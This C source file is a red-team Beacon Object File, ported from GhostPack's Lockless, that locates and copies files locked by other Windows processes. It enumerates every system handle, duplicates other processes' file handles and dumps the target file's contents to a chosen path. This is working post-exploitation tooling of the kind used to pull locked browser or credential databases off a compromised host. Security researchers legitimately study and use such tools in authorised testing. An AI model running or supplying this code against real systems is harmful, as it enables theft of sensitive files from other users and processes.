/**
 * Copyright 2024 Aon plc
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/*
ported from https://github.com/GhostPack/Lockless
*/

#include <windows.h>
#include <tlhelp32.h>
#include <ntdef.h>
#include <ntstatus.h>
#include <stdlib.h>

#include "beacon.h"
#include "bofdefs.h"
#include "native.h"
#include "util.h"

#define DEVICE_NAME_MAXLEN 0x30
#define DEVICE_PATH_LEN 0x200
#define OBJECTNAMELENGTH 0x200
#define HANDLEINFOSIZE 0x10000

BOOL CopyFileFromHandle(const HANDLE srcFileHandle, const PCHAR dstFilePath){
	
	//get file size
	LARGE_INTEGER filesize;
	if (!GetFileSizeEx(srcFileHandle, &filesize)){
		err("GetFileSizeEx failed: 0x%lx\n", GetLastError());
		return FALSE;
	}
	msg("File size %llu\n", filesize);
	//create file mapping
	HANDLE hMapFile = CreateFileMappingA(srcFileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
	if (!hMapFile){
		err("CreateFileMappingA failed: 0x%lx\n", GetLastError());
		return FALSE;
	}
	//map file to memory
	HANDLE hMapView = MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
	if (!hMapView){
		err("MapViewOfFile failed: 0x%lx\n", GetLastError());
		return FALSE;
	}

	//create/open file handle
	HANDLE hDestFile = CreateFileA(dstFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
	if (!hDestFile){
		err("CreateFile failed: 0x%lx\n", GetLastError());
		return FALSE;
	}

	//write mapped file to destination
	DWORD written = 0;
	if (!WriteFile(hDestFile, hMapView, filesize.QuadPart, &written, NULL)){
		err("WriteFile failed: 0x%lx\n", GetLastError());
		return FALSE;		
	}
	UnmapViewOfFile(hMapView);
	CloseHandle(hDestFile);
	CloseHandle(hMapFile);

	return TRUE;
}

/*
convert dos_path in input to device_path in output, path_len will contain the length of the string
*/
BOOL ConvertDosPathToDevicePath(const PCHAR dosPath, PCHAR devicePath, PDWORD devicePathSize) {
	
	//extract dos_path
	char dos_device[4];
	if (!GetVolumePathNameA(dosPath, dos_device, 4)){
		err("GetVolumePathNameA failed: 0x%lx\n", GetLastError());
		return FALSE;
	}
	dos_device[2] = '\0';

	//convert to device name
	PCHAR device_name = (PCHAR)intAlloc(DEVICE_NAME_MAXLEN);
	DWORD device_name_len = QueryDosDevice(dos_device, device_name, DEVICE_NAME_MAXLEN);
	if (!device_name_len){
		err("QueryDosDevice failed: 0x%lx\n", GetLastError());
		return FALSE;
	}
	//msg("device: %s\n", device_name);

	//create device path string
	size_t pathLen = StringLengthA(dosPath);
	PCHAR filepath = (PCHAR)intAlloc(pathLen + 1);
	ZeroMemory(filepath, pathLen);
	CopyMemoryEx(filepath, dosPath+2, pathLen);

	if (pathLen + device_name_len > *devicePathSize){
		err("Device path too big for buffer\n");
		return FALSE;
	}

	//snprintf(devicePath, *devicePathSize, "%s%s", device_name, filepath);
	if (!StringConcat(devicePath, *devicePathSize, device_name, StringLengthA(device_name), filepath, StringLengthA(filepath))){

	}
	//msg("%s\n",devicePath);

	return TRUE;
}

#ifdef BOF /****** BOF ENTRY FUNCTION ******/
void go(char * args, int alen){
#else /****** TEST FUNCTION ******/
#include <time.h>
#include <stdio.h>
int main(int argc, char* argv[]){
	int result = -1;
#endif   
	//do we need to adjust privileges first?
	NTSTATUS ntstatus = 0;
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
    ULONG handleInfoSize = HANDLEINFOSIZE;
    size_t objectNameLength = OBJECTNAMELENGTH;//sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION objectNameInfo = NULL;
    HANDLE processHandle = NULL;
    DWORD pid = 0;
    PCHAR sourcefile = NULL;
    PCHAR destfile = NULL;
    PCHAR filename = NULL;

#ifdef BOF
    //parse bof arguments
	datap  parser = {0};
	sourcefile = NULL;
	destfile = NULL;
	
	BeaconDataParse(&parser, args, alen);
	sourcefile = BeaconDataExtract(&parser, NULL);
	destfile = BeaconDataExtract(&parser, NULL);

	destfile = *destfile == 0 ? NULL : destfile;

#else
    //parse cmd line args
    if (argc < 2){
    	msg("Usage:%s <source> [<dest>]\n", argv[0]);
    	exit(-1);
    }
    sourcefile = argv[1];
    if (argc >= 3){
    	destfile = argv[2];
    }
    
#endif

    msg("Searching for handle to file %s\n", sourcefile);
    DWORD device_path_len = DEVICE_PATH_LEN;
    PCHAR devicepath = (PCHAR)intAlloc(device_path_len);
    if (!ConvertDosPathToDevicePath(sourcefile, devicepath, &device_path_len)) {
    	goto exit;
    }

    //resolve nt functions
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetLibraryProcAddress("ntdll.dll", "NtQuerySystemInformation");
    _NtQueryObject NtQueryObject = (_NtQueryObject)GetLibraryProcAddress("ntdll.dll", "NtQueryObject");
    //_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetLibraryProcAddress("ntdll.dll", "RtlAdjustPrivilege");

    //BOOLEAN prevPrivState = FALSE;
    //ntstatus = RtlAdjustPrivilege(20, TRUE, FALSE, &prevPrivState);
    //if (!NT_SUCCESS(ntstatus)){
    //	err("RtlAdjustPrivilege failed: 0x%x\n", ntstatus);
    //}

    //get system handles
    handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)intAlloc(handleInfoSize);
    ntstatus = NtQuerySystemInformation(SYSTEMHANDLEINFORMATION, handleTableInformation, handleInfoSize, NULL);
    while (ntstatus == STATUS_INFO_LENGTH_MISMATCH){
    	handleTableInformation = intRealloc(handleTableInformation, handleInfoSize*=2);
    	ntstatus = NtQuerySystemInformation(SYSTEMHANDLEINFORMATION, handleTableInformation, handleInfoSize, NULL);
    }
    if (!NT_SUCCESS(ntstatus)){
    	err("NtQuerySystemInformation failed: 0x%lx\n", ntstatus);
        goto exit;
    }
    //iterate all process to identify all open file handles
	HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if (!hProcSnap || hProcSnap == INVALID_HANDLE_VALUE){
	    err("CreateToolhelp32Snapshot failed: 0x%lx\n", GetLastError());
	    goto exit;
	}
	PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(process);
    if (!Process32First(hProcSnap, &process)){
    	err("Process32First failed: 0x%lx\n", GetLastError());
	    goto exit;
    }
    do {
    	pid = process.th32ProcessID;
    	if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid)))
        {
        	//msg("failed to open process %d\n", pid);
            continue;
        }
        //msg("pid %d\n", pid);
        for (int i = 0; i < handleTableInformation->NumberOfHandles; i++){
        	SYSTEM_HANDLE_TABLE_ENTRY_INFO handle = handleTableInformation->Handles[i];
        	if (handle.UniqueProcessId != pid){
        		//msg("skipping\n");
        		continue;
        	}
        	HANDLE dupHandle = NULL;
        	//ntstatus = NtDuplicateObject(processHandle, (HANDLE)(handle.HandleValue), NtCurrentProcess, &dupHandle, 0, 0, 0);
        	//if (!NT_SUCCESS(ntstatus))
        	if (!DuplicateHandle(processHandle, (HANDLE)handle.HandleValue, NtCurrentProcess, &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS))
            {
            	//err("DuplicateHandle failed: 0x%lx\n", GetLastError());
                continue;
            }
            if (GetFileType(dupHandle) != FILE_TYPE_DISK){
            	//msg("handle not a file\n");
            	CloseHandle(dupHandle);
            	continue;
            }
            objectNameInfo = intAlloc(objectNameLength);
            ULONG retLen = 0;
            ntstatus = NtQueryObject(dupHandle, OBJECTNAMEINFORMATION, objectNameInfo, objectNameLength, &retLen);
        	if (!NT_SUCCESS(ntstatus))
            {
            	err("NtQueryObject failed: 0x%lx\n", ntstatus);
                goto exit;
            }
            UNICODE_STRING ufn = objectNameInfo->Name;
            filename = intAlloc(ufn.Length/2 + 1);
            WCharStringToCharString(filename, ufn.Buffer, ufn.Length/2 + 1);
            //msg("file: %s\n", filename);
            
            if (!cmpstr(ToLower(filename), ToLower(devicepath))){
            	msg("File open by PID %lu\n", pid);

            	//target file handle found, copy file
            	if (destfile){
            		//msg("copying\n");
            		if (CopyFileFromHandle(dupHandle, destfile)){
            			msg("File copied successfully\n");
            		}
            		else {
            			msg("Copy failed\n");
            		}
            	}

            	goto exit;
            }

            CloseHandle(dupHandle);
            if (objectNameInfo){
	            if (objectNameInfo->Name.Buffer){
		    		ZeroMemory(objectNameInfo->Name.Buffer, objectNameInfo->Name.Length);
		    	}
		    	ZeroMemory(objectNameInfo, objectNameLength);
		    	intFree(objectNameInfo);
	    	}
        }
        CloseHandle(processHandle);

    }
    while (Process32Next(hProcSnap, &process));
    msg("file not found\n");

    exit:
    if (hProcSnap && hProcSnap != INVALID_HANDLE_VALUE){
    	CloseHandle(hProcSnap);
    }
    if (handleTableInformation){
	    ZeroMemory(handleTableInformation, sizeof(handleInfoSize));
    	intFree(handleTableInformation);
    }
    if (objectNameInfo){
    	if (objectNameInfo->Name.Buffer){
    		ZeroMemory(objectNameInfo->Name.Buffer, objectNameInfo->Name.Length);
    	}
    	ZeroMemory(objectNameInfo, objectNameLength);
    	intFree(objectNameInfo);
    }
#ifdef BOF
    return;
#else
    return result;
#endif
}
